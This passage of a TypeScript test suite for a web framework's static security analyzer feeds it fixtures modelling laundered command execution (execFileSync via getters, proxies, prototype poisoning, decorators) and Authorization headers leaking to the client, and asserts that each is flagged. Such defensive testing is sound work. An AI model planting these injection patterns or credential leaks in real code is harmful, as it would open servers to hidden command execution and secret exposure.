        respond.file = () => { execFileSync('function-respond'); return 'unsafe'; };
        return query({ load() { return respond.file(); } });
      }
      withLocalRespond();
    `);

    expect(facts.length).toBeGreaterThanOrEqual(4);
    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ source: '<dynamic-callback>' }),
        expect.objectContaining({ source: 'respond.file' }),
      ]),
    );
  });

  it('rejects helper and container laundering of exact guard and respond carriers', () => {
    for (const body of [
      `
        function poison(carrier) { carrier.file = hostile; }
        poison(respond);
        return respond.file('safe', { contentType: 'text/plain' });
      `,
      `
        const holder = { carrier: respond };
        holder.carrier.file = hostile;
        return respond.file('safe', { contentType: 'text/plain' });
      `,
    ]) {
      const facts = sinksFor(`
        import { execFileSync } from 'node:child_process';
        import { endpoint, respond } from '@kovojs/server';
        const hostile = () => { execFileSync('respond-carrier'); return 'unsafe'; };
        export const unsafe = endpoint('/unsafe', { handler() { ${body} } });
      `);
      expect(facts.length).toBeGreaterThan(0);
    }

    for (const setup of [
      `function poison(carrier) { carrier.rateLimit = hostile; } poison(guards);`,
      `const holder = { carrier: guards }; holder.carrier.rateLimit = hostile;`,
    ]) {
      const facts = sinksFor(`
        import { guards, query } from '@kovojs/server';
        const hostile = () => () => true;
        ${setup}
        export const unsafe = query({
          guard: guards.rateLimit({ max: 10, per: 'global' }),
          load() { return { ok: true }; },
        });
      `);
      expect(facts.length).toBeGreaterThan(0);
    }
  });

  it('fails closed on opaque package carriers used by implicit property protocols', () => {
    const facts = sinksFor(`
      import carrier from 'opaque-carrier';
      import { query } from '@kovojs/server';
      export const unsafe = query({ load() {
        const { value } = carrier;
        const copy = { ...carrier };
        'value' in carrier;
        delete carrier.value;
        carrier.value = 1;
        carrier.value++;
        for (const key in carrier) void key;
        return [value, copy, carrier.other];
      } });
    `);

    expect(
      facts.filter((fact) => fact.sink === 'request-handler.opaque-protocol').length,
    ).toBeGreaterThanOrEqual(6);
  });

  it('fails closed on opaque Object/Reflect targets and nested descriptor carriers', () => {
    const facts = sinksFor(`
      import carrier from 'opaque-carrier';
      import { query } from '@kovojs/server';
      export const unsafe = query({ load() {
        Object.keys(carrier);
        Object.getPrototypeOf(carrier);
        Object.defineProperties({}, { value: carrier });
        Reflect.get(carrier, 'value');
        Reflect.set({}, 'value', 1, carrier);
        Reflect.construct(Array, [], carrier);
        return null;
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );
  });

  it('traverses local prototype getters and rejects opaque prototype chains', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import carrier from 'opaque-carrier';
      import { query } from '@kovojs/server';
      const proto = { get secret() { return execFileSync('fixed'); } };
      export const unsafe = query({ load() {
        const created = Object.create(proto);
        const mutated = {};
        Object.setPrototypeOf(mutated, proto);
        const literal = { __proto__: proto };
        const opaque = Object.create(carrier);
        return [created.secret, mutated.secret, literal.secret, opaque.secret];
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'child_process.execFileSync' }),
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );
  });

  it('does not trust writable global-object aliases for namespaces, fetch, or timers', () => {
    const facts = sinksFor(`
      import carrier from 'opaque-carrier';
      import { query } from '@kovojs/server';
      export const unsafe = query({ load() {
        globalThis.JSON = carrier;
        globalThis.fetch = carrier;
        globalThis.setTimeout = carrier;
        globalThis.JSON.stringify({ ok: true });
        globalThis.fetch('https://example.test');
        globalThis.setTimeout(() => {}, 1);
        return null;
      } });
    `);

    expect(
      facts.filter(
        (fact) =>
          fact.sink === 'request-handler.opaque-call' ||
          fact.sink === 'request-handler.opaque-package-call',
      ).length,
    ).toBeGreaterThanOrEqual(3);
  });

  it('scans JSX spreads, decorators, and class heritage at definition time', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import carrier from 'opaque-carrier';
      import { query } from '@kovojs/server';
      function decorate(value) { execFileSync('fixed'); return value; }
      export const unsafe = query({ load() {
        @decorate class Decorated {}
        class Derived extends carrier {}
        const intrinsic = <div {...carrier} />;
        return [Decorated.name, Derived.name, intrinsic];
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'child_process.execFileSync' }),
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );
  });

  it('recognizes provenance-bound public style attrs in intrinsic JSX spreads', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      import * as style from '@kovojs/style';
      const styles = style.create({ root: { color: 'rebeccapurple' } }, { namespace: 'card' });
      export const styled = query({ load() {
        return <div {...style.attrs(styles.root)}>Card</div>;
      } });
    `);

    expect(facts).toEqual([]);
  });

  it('recognizes the exact public starter style and render authoring surface', () => {
    const facts = sinksFor(`
      import { component, FormError } from '@kovojs/core';
      import { mutation, mutationFormAttributes, publicAccess } from '@kovojs/server';
      import * as style from '@kovojs/style';
      import { defineTheme } from '@kovojs/style';
      import { Badge } from '@kovojs/ui/badge';
      import { Button } from '@kovojs/ui/button';
      import { Card } from '@kovojs/ui/card';
      const theme = defineTheme({ seed: '#6750A4' });
      const styles = style.create({
        root: {
          backgroundColor: style.tokens.sys.color.surface,
          borderRadius: style.tokens.sys.shape.cornerMedium,
        },
      });
      const save = mutation({ access: publicAccess('test'), handler() { return { ok: true }; } });
      const Local = component({ render: ({ value }) => <span style={styles.root}>{value}</span> });
      export const view = component({ render: (_props, _slots, context) =>
        Card.definition.render({ children: <main style={styles.root}>
          <Local value="starter" />
          {Badge.definition.render({ variant: 'neutral', children: 'ready' })}
          <form {...mutationFormAttributes(save)}>
            <FormError mutation={save} result={context.mutations?.save} />
            {Button.definition.render({ type: 'submit', children: 'Save' })}
          </form>
        </main> })
      });
      void theme;
    `);

    expect(facts).toEqual([]);
  });

  it('keeps starter render provenance exact and scans values passed through it', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      import * as style from '@kovojs/style';
      import * as internalStyle from '@kovojs/style/internal';
      import { Button } from '@kovojs/ui/button';
      import { execFileSync } from 'node:child_process';
      const FormError = ({ value }) => value;
      const LocalButton = { definition: { render(value) { return value; } } };
      export const unsafe = query({ load(input, context) {
        const credential = context.request.headers.get('authorization');
        const dynamic = style[input.method];
        void dynamic;
        void style;
        internalStyle.createAtomicStyles({ color: 'red' });
        Button.definition.render = () => execFileSync('mutated-ui-render');
        const a = Button.definition.render({ children: credential });
        const b = LocalButton.definition.render({ children: credential });
        const c = <FormError value={credential} />;
        return [a, b, c];
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
        expect.objectContaining({ sink: 'request-handler.opaque-call' }),
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );
    expect(
      facts.some(
        (fact) =>
          fact.sink === '@kovojs/style.[computed]' ||
          fact.sink === '@kovojs/style.namespace' ||
          fact.sink.includes('@kovojs/style/internal'),
      ),
    ).toBe(true);

    const exactFormErrorLeak = sinksFor(`
      import { FormError } from '@kovojs/core';
      import { query } from '@kovojs/server';
      export const unsafe = query({ load(_input, context) {
        const credential = context.request.headers.get('authorization');
        return <FormError failure={{ code: 'FAILED' }} futureProp={credential} message="fixed" />;
      } });
    `);
    expect(exactFormErrorLeak).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
  });

  it('does not turn reviewed JSX helper results or UI descriptors into ambient capabilities', () => {
    const helperArgumentCarriers = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { mutation, mutationFormAttributes, publicAccess } from '@kovojs/server';
      export const unsafe = mutation({ access: publicAccess('fixture'), handler() {
        const callbackCarrier = { run() { return execFileSync('helper-callback'); } };
        const getterCarrier = { get mutation() { return execFileSync('helper-getter'); } };
        const proxyCarrier = new Proxy({}, {
          get() { return execFileSync('helper-proxy'); },
        });
        mutationFormAttributes(callbackCarrier);
        mutationFormAttributes(getterCarrier);
        mutationFormAttributes(proxyCarrier);
        return null;
      } });
    `);
    expect(
      helperArgumentCarriers
        .filter(({ sink }) => sink === 'child_process.execFileSync')
        .map(({ source }) => source),
    ).toEqual(expect.arrayContaining(["'helper-callback'", "'helper-getter'", "'helper-proxy'"]));

    const helperResults = sinksFor(`
      import { mutation, mutationFormAttributes, publicAccess } from '@kovojs/server';
      import * as style from '@kovojs/style';
      import { execFileSync } from 'node:child_process';
      const styles = style.create({ root: { color: 'red' } });
      const save = mutation({ access: publicAccess('test'), handler() { return null; } });
      export const unsafe = mutation({ access: publicAccess('test'), handler() {
        const styleAttributes = style.attrs(styles.root);
        const formAttributes = mutationFormAttributes(save);
        Object.defineProperty(styleAttributes, 'evil', {
          get() { return execFileSync('style-attrs-member'); },
        });
        Object.defineProperty(formAttributes, 'mutation', {
          get() { return execFileSync('mutation-attrs-member'); },
        });
        return [styleAttributes.evil, formAttributes.mutation];
      } });
    `);
    expect(helperResults.filter((fact) => fact.sink === 'child_process.execFileSync')).toHaveLength(
      2,
    );
    expect(helperResults).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );

    const crossModuleUiMutation = sinksForFiles([
      {
        fileName: 'mutate.ts',
        source: `
          import { Button } from '@kovojs/ui/button';
          Object.defineProperty(Button.definition, 'render', {
            get() { return () => 'attacker-controlled'; },
          });
        `,
      },
      {
        fileName: 'app.tsx',
        source: `
          import './mutate.js';
          import { query } from '@kovojs/server';
          import { Button } from '@kovojs/ui/button';
          export const unsafe = query({ load() {
            return Button.definition.render({ children: 'unsafe' });
          } });
        `,
      },
    ]);
    expect(crossModuleUiMutation).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-call' }),
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );
  });

  it('scans direct, spread, and getter-backed FormError callbacks', () => {
    const facts = sinksFor(`
      import { component, FormError } from '@kovojs/core';
      import { createApp, route } from '@kovojs/server';
      import { execFileSync } from 'node:child_process';
      const spread = {
        message: () => execFileSync('form-error-spread-callback'),
      };
      const getterBacked = {
        get message() {
          execFileSync('form-error-message-getter');
          return () => 'fixed';
        },
      };
      const Proof = component({ render: () => <main>
        <FormError
          failure={{ code: 'FAILED' }}
          message={() => execFileSync('form-error-direct-callback')}
        />
        <FormError failure={{ code: 'FAILED' }} {...spread} />
        <FormError failure={{ code: 'FAILED' }} {...getterBacked} />
      </main> });
      createApp({ routes: [route('/', { page: () => <Proof /> })] });
    `);

    expect(
      facts.filter((fact) => fact.sink === 'child_process.execFileSync').map((fact) => fact.source),
    ).toEqual(
      expect.arrayContaining([
        "'form-error-direct-callback'",
        "'form-error-spread-callback'",
        "'form-error-message-getter'",
      ]),
    );
  });

  it('does not exempt a callable forwarded into a compiler-owned intrinsic event slot', () => {
    const facts = sinksFor(`
      import { component } from '@kovojs/core';
      import { createApp, route } from '@kovojs/server';
      import { execFileSync } from 'node:child_process';
      const Child = component({
        render: (props) => <button onClick={props.onClick}>Run</button>,
      });
      const Parent = component({
        render: () => <Child onClick={() => execFileSync('forwarded-event-callback')} />,
      });
      createApp({ routes: [route('/', { page: () => <Parent /> })] });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'forwarded-event-callback'",
        }),
      ]),
    );
  });

  it('keeps typeof results primitive without hiding getter execution', () => {
    const facts = sinksFor(`
      import carrier from 'opaque-carrier';
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      const local = {
        get secret() { execFileSync('typeof-getter'); return 'secret'; },
      };
      export const unsafe = query({ load() {
        return [typeof local.secret, typeof carrier.secret];
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'child_process.execFileSync' }),
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );
  });

  it('does not bless style lookalikes or stop scanning authored style arguments', () => {
    const packageLookalike = sinksFor(`
      import { query } from '@kovojs/server';
      import * as style from 'style-lookalike';
      export const unsafe = query({ load() {
        return <div {...style.attrs(style.create({ root: { color: 'red' } }).root)} />;
      } });
    `);
    expect(packageLookalike).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-package-call' }),
      ]),
    );

    const localLookalike = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      const style = {
        create(value) { return value; },
        attrs(value) { execFileSync('fixed'); return value; },
      };
      export const unsafe = query({ load() {
        const styles = style.create({ root: { class: 'fake' } });
        return <div {...style.attrs(styles.root)} />;
      } });
    `);
    expect(localLookalike).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'child_process.execFileSync' })]),
    );

    const authoredExecution = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      import * as style from '@kovojs/style';
      export const unsafe = query({ load() {
        const styles = style.create({
          get root() {
            execFileSync('fixed');
            return { color: 'red' };
          },
        });
        style.attrs(() => execFileSync('fixed'));
        return <div {...style.attrs(styles.root)} />;
      } });
    `);
    expect(
      authoredExecution.filter((fact) => fact.sink === 'child_process.execFileSync'),
    ).toHaveLength(2);

    const credentialLeak = sinksFor(`
      import { query } from '@kovojs/server';
      import * as style from '@kovojs/style';
      export const unsafe = query({ load(_input, context) {
        const styles = style.create({
          root: { color: context.request.headers.get('authorization') },
        });
        return <div {...style.attrs(styles.root)} />;
      } });
    `);
    expect(credentialLeak).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
  });

  it('closes Web dictionary, JSON auxiliary, RegExp, timer, and async assimilation hooks', () => {
    const facts = sinksFor(`
      import carrier from 'opaque-carrier';
      import { query } from '@kovojs/server';
      export const unsafe = query({ async load() {
        new Headers({ value: carrier });
        Response.json({}, { statusText: carrier, headers: [['value', carrier]] });
        JSON.stringify({}, [carrier], carrier);
        new ArrayBuffer(8, { maxByteLength: carrier });
        new RegExp(carrier, carrier);
        setTimeout(() => {}, carrier);
        for await (const value of [carrier]) void value;
        async function* values() { yield carrier; }
        void values;
        return carrier;
      } });
    `);

    expect(
      facts.filter((fact) => fact.sink === 'request-handler.opaque-protocol').length,
    ).toBeGreaterThanOrEqual(8);
  });

  it('rejects reviewed receiver calls after own-member or prototype replacement', () => {
    const facts = sinksFor(`
      import carrier from 'opaque-carrier';
      import { endpoint, query } from '@kovojs/server';
      export const requestCase = endpoint('/unsafe', { async handler(request) {
        Object.setPrototypeOf(request, carrier);
        return request.text();
      } });
      export const responseCase = query({ async load() {
        const response = await fetch('https://example.test');
        Object.defineProperty(response, 'json', { value: carrier });
        return response.json();
      } });
      export const errorCase = query({ load() {
        const error = new Error('fixed');
        error.name = carrier;
        return error.toString();
      } });
    `);

    expect(
      facts.filter(
        (fact) =>
          fact.sink === 'request-handler.opaque-call' ||
          fact.sink === 'request-handler.opaque-package-call',
      ).length,
    ).toBeGreaterThanOrEqual(3);
  });

  it('resolves local component descriptors through js-spelled TSX imports', () => {
    const facts = sinksForFiles([
      {
        fileName: 'components/card.tsx',
        source: `
          import { execFileSync } from 'node:child_process';
          import { component } from '@kovojs/core';
          export const Card = component({
            render: () => { execFileSync('component-render'); return <strong>safe</strong>; },
          });
        `,
      },
      {
        fileName: 'app.tsx',
        source: `
          import { createApp, route } from '@kovojs/server';
          import { Card } from './components/card.js';
          export default createApp({
            routes: [route('/', { page: () => <main><Card /></main> })],
          });
        `,
      },
    ]);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'component-render'",
        }),
      ]),
    );
    expect(
      facts.filter(
        (fact) =>
          fact.sink === 'client-wire.request.opaque-jsx-component' ||
          (fact.sink === 'request-handler.opaque-protocol' &&
            fact.source.includes('jsx-component')),
      ),
    ).toEqual([]);
  });

  it('preserves component JsonValue state roles through lexical IIFEs', () => {
    const safeFacts = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { component } from '@kovojs/core';
      import { createApp, route } from '@kovojs/server';
      const Island = component({
        state: () => ({ cards: [{ label: 'first' }], groups: [[{ label: 'nested' }]] }),
        render: (_queries, state) => <section>
          {(() => { const [card] = state.cards; return card.label; })()}
          {(() => { const { groups: [[group]] } = state; return group.label; })()}
          <button onClick={() => { state.cards = [{ label: 'next' }]; }}>Next</button>
        </section>,
      });
      createApp({ routes: [route('/', { page: () => <Island /> })] });
    `);
    expect(safeFacts).toEqual([]);

    const capabilityFacts = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { component } from '@kovojs/core';
      import { createApp, route } from '@kovojs/server';
      const Island = component({
        render: (_queries, _state, slots) =>
          <main>{(() => slots.pwn())()}</main>,
      });
      createApp({ routes: [route('/', { page: () => <Island /> })] });
    `);
    expect(capabilityFacts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'slots.pwn' }),
      ]),
    );

    for (const calls of [
      `const plain = pass('plain'); return <main>{plain + pass(slots)}</main>;`,
      `const closed = pass(slots); return <main>{closed + pass('plain')}</main>;`,
    ]) {
      const invocationRoleFacts = sinksFor(`
        /** @jsxImportSource @kovojs/server */
        import { component } from '@kovojs/core';
        import { createApp, route } from '@kovojs/server';
        const Island = component({
          render(_queries, _state, slots) {
            function pass(value) {
              function inner() { return value.trim(); }
              return inner();
            }
            ${calls}
          },
        });
        createApp({ routes: [route('/', { page: () => <Island /> })] });
      `);
      expect(invocationRoleFacts, calls).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'value.trim' }),
        ]),
      );
    }
  });

  it('rejects imported mutable containers before cross-module accessors or mutations can run', () => {
    const facts = sinksForFiles([
      {
        fileName: 'state.ts',
        source: `
          import { execFileSync } from 'node:child_process';
          export const state = {
            get secret() { return execFileSync('exported-getter').toString(); },
            count: 0,
          };
        `,
      },
      {
        fileName: 'mutator.ts',
        source: `
          import { execFileSync } from 'node:child_process';
          import { state } from './state.js';
          Object.defineProperty(state, 'count', {
            get() { return execFileSync('side-effect-getter').length; },
          });
          Object.setPrototypeOf(state, { inherited: 1 });
        `,
      },
      {
        fileName: 'app.ts',
        source: `
          import './mutator.js';
          import { mutation } from '@kovojs/server';
          import { state } from './state.js';
          export const update = mutation({ handler() {
            return { count: state.count, secret: state.secret };
          } });
        `,
      },
    ]);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );
  });

  it('scans endpoint and webhook descriptors in the shared app endpoint collection', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { createApp, endpoint, webhook } from '@kovojs/server';
      const plain = endpoint('/plain', { handler() {
        execFileSync('plain-handler');
        return new Response('plain');
      } });
      const hook = webhook('/hook', { handler() {
        execFileSync('webhook-handler');
        return { ok: true };
      } });
      createApp({ endpoints: [plain, hook] });
    `);

    expect(
      facts.filter((fact) => fact.sink === 'child_process.execFileSync').map((fact) => fact.source),
    ).toEqual(expect.arrayContaining(["'plain-handler'", "'webhook-handler'"]));
    expect(
      facts.filter(
        (fact) =>
          fact.sink === 'request-handler.opaque-source' && fact.source.includes('unresolved-'),
      ),
    ).toEqual([]);
  });

  it('keeps compiler-lowered component event handlers off the public wire', () => {
    const facts = sinksFor(`
      import { component } from '@kovojs/core';
      import { createApp, route } from '@kovojs/server';
      const Interactive = component({
        state: () => ({ count: 0 }),
        render: (_props, state) => (
          <button onClick={() => { state.count += 1; }}>{state.count}</button>
        ),
      });
      createApp({ routes: [route('/', { page: () => <Interactive /> })] });
    `);

    expect(
      facts.filter(
        (fact) =>
          fact.sink === 'client-wire.request.opaque-value' &&
          fact.source.includes('state.count += 1'),
      ),
    ).toEqual([]);

    const lowercaseFacts = sinksFor(`
      import { component } from '@kovojs/core';
      import { createApp, route } from '@kovojs/server';
      const NotLowered = component({
        render: () => <button onclick={() => 'not compiler owned'}>go</button>,
      });
      createApp({ routes: [route('/', { page: () => <NotLowered /> })] });
    `);

    expect(lowercaseFacts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'client-wire.request.opaque-value',
          source: "() => 'not compiler owned'",
        }),
      ]),
    );
  });

  it('resolves imported query declarations in createApp collections', () => {
    const facts = sinksForFiles([
      {
        fileName: 'queries/contacts.ts',
        source: `
          import { execFileSync } from 'node:child_process';
          import { query } from '@kovojs/server';
          export const contactsQuery = query('contacts', {
            load() { return { output: execFileSync('imported-query-load') }; },
          });
        `,
      },
      {
        fileName: 'app.ts',
        source: `
          import { createApp } from '@kovojs/server';
          import { contactsQuery } from './queries/contacts.js';
          createApp({ queries: [contactsQuery] });
        `,
      },
    ]);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'imported-query-load'",
        }),
      ]),
    );
    expect(
      facts.filter(
        (fact) =>
          fact.sink === 'request-handler.opaque-source' &&
          fact.source === '<unresolved-query-declaration>',
      ),
    ).toEqual([]);
  });

  it('closes runtime import, re-export, import-equals, and unresolved relative initializer edges', () => {
    const opaque = sinksFor(`
      import {} from 'opaque-runtime-module';
      import type { Erased } from 'opaque-type-only';
      import { type AlsoErased, runtimeValue } from 'opaque-mixed-import';
      import opaque = require('opaque-import-equals');
      import type erased = require('opaque-type-import-equals');
      export { value } from 'opaque-reexport';
      import '/@fs/private/outside-app.js';
      void opaque;
      void runtimeValue;
    `);
    expect(opaque).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ source: '<opaque-module-initializer:opaque-runtime-module>' }),
        expect.objectContaining({ source: '<opaque-module-initializer:opaque-mixed-import>' }),
        expect.objectContaining({ source: '<opaque-module-initializer:opaque-import-equals>' }),
        expect.objectContaining({ source: '<opaque-module-initializer:opaque-reexport>' }),
        expect.objectContaining({
          source: '<opaque-module-initializer:/@fs/private/outside-app.js>',
        }),
      ]),
    );
    expect(JSON.stringify(opaque)).not.toContain('opaque-type-only');
    expect(JSON.stringify(opaque)).not.toContain('opaque-type-import-equals');

    const relative = sinksForFiles([
      {
        fileName: 'src/app.ts',
        source: `
          import './reviewed.js';
          import '../outside.js';
        `,
      },
      { fileName: 'src/reviewed.ts', source: `export const reviewed = true;` },
    ]);
    expect(relative).toEqual([
      expect.objectContaining({ source: '<opaque-module-initializer:../outside.js>' }),
    ]);
  });

  it('scans eager local helpers and destructuring getters before module evaluation', () => {
    const helper = sinksFor(`
      import { execFileSync } from 'node:child_process';
      function initialize() { execFileSync('/usr/bin/touch', ['helper-marker']); }
      initialize();
    `);
    expect(helper).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'child_process.execFileSync' })]),
    );

    const getter = sinksFor(`
      import { execFileSync } from 'node:child_process';
      const poison = {
        get value() { execFileSync('/usr/bin/touch', ['getter-marker']); return 1; },
      };
      const { value } = poison;
      void value;
    `);
    expect(getter).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'child_process.execFileSync' })]),
    );

    const defaultsAndCatch = sinksFor(`
      import { execFileSync } from 'node:child_process';
      const executeMarker = () => execFileSync('/usr/bin/touch', ['default-marker']);
      const { value = executeMarker() } = {};
      const [item = executeMarker()] = [];
      const { nested: { leaf = executeMarker() } } = { nested: {} };
      const poison = { get value() { executeMarker(); return 1; } };
      try { throw poison; } catch ({ value: caught }) { void caught; }
      void value;
      void item;
      void leaf;
    `);
    expect(
      defaultsAndCatch.filter((fact) => fact.sink === 'child_process.execFileSync').length,
    ).toBeGreaterThanOrEqual(1);
    expect(defaultsAndCatch).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-protocol',
          source: expect.stringContaining('catch-binding-destructuring'),
        }),
      ]),
    );
  });

  it('scans runtime namespaces and top-level disposal protocols before module evaluation', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      namespace Simple { execFileSync('namespace-simple'); }
      namespace Nested { export namespace Inner { execFileSync('namespace-nested'); } }
      export namespace Exported { execFileSync('namespace-exported'); }
      namespace Dotted.Inner { execFileSync('namespace-dotted'); }
      namespace Merged { export const safe = true; }
      namespace Merged { execFileSync('namespace-merged'); }
      module Poison { execFileSync('module-poison'); }
      namespace RuntimeValue { export const member = 1; }
      namespace InternalAlias { import member = RuntimeValue.member; void member; }
      namespace ExternalAlias { import opaque = require('opaque-namespace-module'); void opaque; }

      using direct = {
        [Symbol.dispose]() { execFileSync('using-direct'); },
      };
      const syncAlias = {
        [Symbol.dispose]() { execFileSync('using-alias'); },
      };
      using aliased = syncAlias;
      await using asyncDirect = {
        async [Symbol.asyncDispose]() { execFileSync('await-using-direct'); },
      };
      const asyncAlias = {
        async [Symbol.asyncDispose]() { execFileSync('await-using-alias'); },
      };
      await using asyncAliased = asyncAlias;

      declare namespace ErasedNamespace { const value: string; }
      declare module 'erased-module' { export const value: string; }
      void direct;
      void aliased;
      void asyncDirect;
      void asyncAliased;
    `);

    expect(
      facts.filter((fact) => fact.sink === 'child_process.execFileSync').map((fact) => fact.source),
    ).toEqual(
      expect.arrayContaining([
        "'namespace-simple'",
        "'namespace-nested'",
        "'namespace-exported'",
        "'namespace-dotted'",
        "'namespace-merged'",
        "'module-poison'",
        "'using-direct'",
        "'using-alias'",
        "'await-using-direct'",
        "'await-using-alias'",
      ]),
    );
    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          source: '<opaque-module-initializer:import-alias:RuntimeValue.member>',
        }),
        expect.objectContaining({
          source: '<opaque-module-initializer:opaque-namespace-module>',
        }),
      ]),
    );
  });

  it('accepts only exact built-in kovo.config preset witnesses', () => {
    const starter = collectStaticBuildTrustFactsFromProject({
      buildConfigEntryFileName: 'kovo.config.ts',
      files: [
        {
          fileName: 'kovo.config.ts',
          source: `
            import { defineConfig, node } from '@kovojs/server/build';
            export default defineConfig({ preset: node({ dockerfile: false }) });
          `,
        },
      ],
    });
    expect(starter.unregisteredSinks).toEqual([]);

    const custom = collectStaticBuildTrustFactsFromProject({
      buildConfigEntryFileName: 'kovo.config.ts',
      files: [
        {
          fileName: 'kovo.config.ts',
          source: `
            import { defineConfig } from '@kovojs/server/build';
            export default defineConfig({
              preset: {
                name: 'node',
                inspect() { return []; },
                emit() { return undefined; },
              },
            });
          `,
        },
      ],
    });
    expect(custom.unregisteredSinks).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'build-config.opaque-authority' })]),
    );

    const relative = collectStaticBuildTrustFactsFromProject({
      buildConfigEntryFileName: 'kovo.config.ts',
      files: [
        {
          fileName: 'kovo.config.ts',
          source: `import './config-helper.js'; export default {};`,
        },
        {
          fileName: 'config-helper.ts',
          source: `
            import { execFileSync } from 'node:child_process';
            execFileSync('/usr/bin/touch', ['config-relative-marker']);
          `,
        },
      ],
    });
    expect(relative.unregisteredSinks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'build-config.opaque-authority' }),
        expect.objectContaining({ sink: 'child_process.execFileSync' }),
      ]),
    );

    const buildAuthorityOutsideConfig = collectStaticBuildTrustFactsFromProject({
      buildConfigEntryFileName: 'kovo.config.ts',
      files: [
        {
          fileName: 'app.ts',
          source: `import * as build from '@kovojs/server/build'; void build;`,
        },
        {
          fileName: 'kovo.config.ts',
          source: `
            import { defineConfig, node } from '@kovojs/server/build';
            export default defineConfig({ preset: node() });
          `,
        },
      ],
    });
    expect(buildAuthorityOutsideConfig.unregisteredSinks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<opaque-module-initializer:@kovojs/server/build>',
        }),
      ]),
    );
  });

  it('accepts only direct named closed redirect calls', () => {
    const direct = sinksFor(`
      import { redirect } from '@kovojs/server';
      export const response = redirect('/login', { status: 303 });
    `);
    expect(direct).toEqual([]);

    const computed = sinksFor(`
      import * as server from '@kovojs/server';
      export const response = server['redirect']('/login', { status: 303 });
    `);
    expect(computed).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: "server['redirect']",
        }),
      ]),
    );
  });

  it('keeps reviewed imports open and skips large unused lazy bodies within a low-second bound', () => {
    const lazy = Array.from(
      { length: 4_000 },
      (_unused, index) => `const lazy${index} = ${index};`,
    ).join('\n');
    const started = Date.now();
    const facts = sinksFor(`
      import {} from 'drizzle-orm';
      import { execFileSync } from 'node:child_process';
      function neverCalled() {
        ${lazy}
        execFileSync('/usr/bin/touch', ['unused-lazy-marker']);
      }
      void neverCalled;
    `);
    expect(facts).toEqual([]);
    expect(Date.now() - started).toBeLessThan(3_000);
  });
});
